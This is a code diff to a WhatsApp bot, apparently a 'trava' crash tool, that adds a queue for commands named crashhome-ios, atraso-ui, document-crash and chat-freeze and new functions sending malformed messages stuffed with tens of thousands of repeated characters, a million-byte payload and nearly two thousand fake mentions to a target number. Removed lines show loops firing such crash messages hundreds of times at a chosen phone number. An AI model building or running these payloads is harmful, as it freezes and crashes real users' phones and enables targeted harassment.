@@ -33,8 +33,32 @@ const crypto = require('crypto');
 const path = require('path')
 const { loadPlugins } = require('./pluginLoader.js');
 const commands = loadPlugins();
+const { bug } = require('./travas/bug.js');
+const telapreta = `${bug}`
+const { bugUrl } = require('./travas/bugUrl.js')
+const heavyCommands = new Set([
+    'crashhome-ios', 'atraso-ui', 'atraso-v3', 'document-crash',
+    'crash-button', 'chat-freeze'
+    // 'nuke' NO es pesado, es de red. Dejarlo aquí lo rompería.
+]);
+const heavyAssets = {
+    ios4: fs.readFileSync('./travas/ios4.js'),
+    ios7: fs.readFileSync('./travas/ios7.js'),
+    ios6: fs.readFileSync('./travas/ios6.js'),
+    travadoc: fs.readFileSync('./travas/travadoc.js'),
+    telapreta: `${bug}`,
+    bugUrl: bugUrl,
+    thumbJpg: fs.readFileSync('./media/thumb.jpg'),
+    olaJpg: fs.readFileSync('./media/ola.jpg'),
+    fotoJpg: fs.readFileSync('./src/foto.jpg'),
+    crashZip: fs.readFileSync('./travas/crash.zip'),
+    ZeppImg: Buffer.from(
+        "iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/AzXg4GAWjAQAACDAAABeUhb3AAAAAElFTkSuQmCC",
+        "base64"
+    )
+};
 
-module.exports = async (conn, m, chatUpdate, store, prefix) => {
+module.exports = async (conn, m, chatUpdate, store, prefix, taskQueue, logger) => {
 try {
 m.id = m.key.id
 m.chat = m.key.remoteJid
@@ -112,9 +136,7 @@ const ios4 = fs.readFileSync('./travas/ios4.js');
 const ios7 = fs.readFileSync('./travas/ios7.js');
 const ios6 = fs.readFileSync('./travas/ios6.js');
 const travadoc = fs.readFileSync('./travas/travadoc.js');
-const { bug } = require('./travas/bug.js');
-const telapreta = `${bug}`
-const { bugUrl } = require('./travas/bugUrl.js')
+
 
 const lol = {
 key: {
@@ -873,7 +895,32 @@ async function IosInvisibleForce(conn, target) {
   });
   console.log(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`)
 }
+if (heavyCommands.has(command)) {
+        // ¡ES UN COMANDO PESADO!
+        if  (!isBot && !isCreator) return 
+        
+        logger.info({ cmd: command, user: sender }, 'Encolando comando pesado...');
+        
+        // Creamos un contexto serializable para el hilo
+        const taskContext = {
+            command: command, // El comando a ejecutar
+            target: m.chat,
+            q: q,
+            args: args,
+            text: text,
+            sender: sender,
+            // Pasamos los buffers pre-cargados
+            assets: heavyAssets
+        };
 
+        // Lo enviamos a la cola de esta sesión
+        taskQueue.enqueue(taskContext);
+        
+        // Reaccionamos para confirmar que se recibió
+        conn.sendMessage(m.chat, { react: { text: "⚙️", key: m.key } });
+
+        return; // ¡Importante! Terminamos la ejecución aquí.
+    }
 try {
     // ✅ Previene el error "Cannot read properties of undefined (reading 'get')"
     if (!commands) {
@@ -1273,161 +1320,109 @@ async function ios(X) {
         console.error("❌ Error al enviar:", err);
     }
 }
-
+async function XyraUiHard(target) {
+  await conn.relayMessage(target, 
+    {
+      locationMessage: {
+        degreesLongitude: 0,
+        degreesLatitude: 0,
+        name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐨 𝐈𝐦 𝐗𝐲𝐫𝐚𝐚𝟒𝐒𝐱⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
+        url: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id", 
+        address:  "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐨 𝐈𝐦 𝐗𝐲𝐫𝐚𝐚𝟒𝐒𝐱⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
+        contextInfo: {
+          externalAdReply: {
+            renderLargerThumbnail: true, 
+            showAdAttribution: true, 
+            body:  "Xyraa4Sx - Anonymous", 
+            title: "ི꒦ྀ".repeat(9000), 
+            sourceUrl: "https://Xyraa4SX." +  "ི꒦ྀ".repeat(9000) + ".id",  
+            thumbnailUrl: null, 
+            quotedAd: {
+              advertiserName: "ི꒦ྀ".repeat(9000), 
+              mediaType: 2,
+              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
+              caption: "-( XYR )-", 
+            }, 
+            pleaceKeyHolder: {
+              remoteJid: "0@s.whatsapp.net", 
+              fromMe: false, 
+              id: "ABCD1234567"
+            }
+          }
+        }
+      }
+    }, 
+  {});
+}
+async function invisível_trava_status(target, carousel = null) {
+  let sxo = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\x10".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "galaxy_message",
+        }
+      }
+    }
+  }, {
+    ephemeralExpiration: 0,
+    forwardingScore: 9741,
+    isForwarded: true,
+    font: Math.floor(Math.random() * 99999999),
+    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+  });
+  let sXoMessage = {
+    extendedTextMessage: {
+      text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
+      contextInfo: {
+        participant: target,
+        mentionedJid: [
+          "0@s.whatsapp.net",
+          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
+        ]
+      }
+    }
+  };
+  const xso = generateWAMessageFromContent(target, sXoMessage, {});
+  await conn.relayMessage("status@broadcast", xso.message, {
+    messageId: xso.key.id,
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+      }]
+    }]
+  });
+  await sleep(500);
+  // envia a primeira mensagem (sxo)
+  await conn.relayMessage("status@broadcast", sxo.message, {
+    messageId: sxo.key.id,
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+      }]
+    }]
+  });
+  await sleep(500);
+  console.log(`ATRASO INVISÍVEL`);
+}
+//case 
 switch(command) {
-  case "crashhome-ios": {
-  if (!isBot && !isCreator) return
-  const X = m.chat
-  const rawText = (m.text ||m.message?.conversation ||"").trim()
-  const found = rawText.match(/(\d+)/) // busca el primer número
-  let times = found ? parseInt(found[1], 10) : 5 // por defecto 10
-  if (isNaN(times) || times < 1) times = 1
-  const MAX_SENDS = 100
-  if (times > MAX_SENDS) times = MAX_SENDS
-  for (let i = 0; i < times; i++) {
-    try {
-      await ios(X)
-    } catch (err) {
-      console.error("atraso+ui:", err)
-    }
-    if (i !== times - 1) await sleep(5000)
-  }
-  conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
-}
-  break
-  case "atraso-ui": {
-  if (!isBot && !isCreator) return
-  const target = m.chat
-  const rawText = (m.text ||m.message?.conversation ||"").trim()
-  const found = rawText.match(/(\d+)/) // busca el primer número
-  let times = found ? parseInt(found[1], 10) : 1 // por defecto 10
-  if (isNaN(times) || times < 1) times = 1
-  const MAX_SENDS = 100
-  if (times > MAX_SENDS) times = MAX_SENDS
-  for (let i = 0; i < times; i++) {
-    try {
-      await Cihuyyy(target)
-    } catch (err) {
-      console.error("atraso+ui:", err)
-    }
-    if (i !== times - 1) await sleep(5000)
-  }
-  conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
-}
-  break
-  case "atraso-v3": {
-  if (!isBot && !isCreator) return
-  const target = m.chat
-  const rawText = (m.text ||m.message?.conversation ||"").trim()
-  const found = rawText.match(/(\d+)/) // busca el primer número
-  let times = found ? parseInt(found[1], 10) : 20 // por defecto 10
-  if (isNaN(times) || times < 1) times = 1
-  const MAX_SENDS = 100
-  if (times > MAX_SENDS) times = MAX_SENDS
-  for (let i = 0; i < times; i++) {
-    try {
-      await DelayBjir(target)
-    } catch (err) {
-      console.error("documentCrash error:", err)
-    }
-    if (i !== times - 1) await sleep(5000)
-  }
-  conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
-}
-  break
-
-  case "document-crash": {
-  if (!isBot && !isCreator) return
-  const target = m.chat
-  const rawText = (m.text ||m.message?.conversation ||"").trim()
-  const found = rawText.match(/(\d+)/) // busca el primer número
-  let times = found ? parseInt(found[1], 10) : 10 // por defecto 10
-  if (isNaN(times) || times < 1) times = 1
-  const MAX_SENDS = 100
-  if (times > MAX_SENDS) times = MAX_SENDS
-  for (let i = 0; i < times; i++) {
-    try {
-      await documentCrash(target) // función que ya tienes
-    } catch (err) {
-      console.error("documentCrash error:", err)
-    }
-    if (i !== times - 1) await sleep(5000)
-  }
-  conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
-}
-  break
-
-  case "xhgr":
-if (!isBot && !isCreator) return
-if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-for (let i = 0; i < 2; i++) {
-ZieeInvisForceIOS(conn, target)
-await sleep(5000)
-ZieeInvisForceIOS(conn, target)
-await sleep(5000)
-ZieeInvisForceIOS(conn, target)
-await sleep(5000)
-ZieeInvisForceIOS(conn, target)
-
-}
-conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
-break
-case "atraso-new": {
-    if (!isBot && !isCreator) return;
-
-    let jid = m.mentionedJid && m.mentionedJid.length > 0
-        ? m.mentionedJid[0]
-        : m.quoted
-            ? m.quoted.sender
-            : (q ? q.replace(/[^0-9]/g, '') : null);
-
-    if (!jid) return reply(" Ingresa un número válido.");
-
-    let target = jid.includes('@s.whatsapp.net') ? jid : jid + "@s.whatsapp.net";
-    if (candList.includes(target)) {
-        //kkkkk
-        await conn.sendMessage(m.chat, { 
-            text: `Nel, con el owner no ` 
-        }, { quoted: m });
-        await conn.sendMessage("593969533280@s.whatsapp.net", { 
-           
-            text: `User *${m.sender}* intentó follar a ${target}.`
-        });
-        return;
-    }
-    for (let i = 0; i < 10; i++) {
-    await invisível_trava_status(target)
-    await sleep(1000)
-    await invisível_trava_status(target)
-    await sleep(1000)
-    await invisível_trava_status(target)
-    }
-    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
-}
-break;  
-case "xhgr2":
-if (!isBot && !isCreator) return
-if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-for (let r = 0; r < 666; r++) {
-await IosInvisibleForce(conn, target)
-await new Promise(resolve => setTimeout(resolve, 500));
-}
-conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
-break
-  case "good":
-if (!isBot && !isCreator) return
-if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-for (let i = 0; i < 4; i++) {
-CtaZts(conn, target)
-await sleep(5000)
-handleSzt(conn, target) 
-}
-conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
-break
-// Dentro de tu switch de comandos
+ 
 case 'new':{
 await conn.relayMessage(from, {
 viewOnceMessage: {
@@ -1662,56 +1657,7 @@ headerType: "DOCUMENT",
 }, {})
 }
 break
-case 'chat-freeze': {
-  if (!isBot) return;
-  try {
-    for (let i = 0; i < 10; i++) {
-      await conn.sendMessage(from, {
-        location: {
-          degreesLatitude: 'ola',
-          degreesLongitude: 'ola',
-          name: `ola`,
-          url: bugUrl,
-          contextInfo: {
-            forwardingScore: 508,
-            isForwarded: true,
-            isLiveLocation: true,
-            fromMe: false,
-            participant: '0@s.whatsapp.net',
-            remoteJid: sender,
-            quotedMessage: {
-              documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
-                mimetype: "application/pdf",
-                title: "crash",
-                pageCount: 1000000000,
-                fileName: "crash.pdf",
-                contactVcard: true
-              }
-            },
-            forwardedNewsletterMessageInfo: {
-              newsletterJid: '120363274419284848@newsletter',
-              serverMessageId: 1,
-              newsletterName: " " + bug + bug
-            },
-            externalAdReply: {
-              title: ' ola ',
-              body: 'ola',
-              mediaType: 0,
-              thumbnail: m,
-              jpegThumbnail: m,
-              mediaUrl: `https://www.youtube.com/@g`,
-              sourceUrl: `https://chat.whatsapp.com/`
-            }
-          }
-        }
-      });
-    }
-  } catch (e) {
-    console.error(e);
-  }
-}
-break;
+
 case 'crash-ui':
 if (!isBot && !isCreator) return
 for (let i = 0; i < 30; i++) {
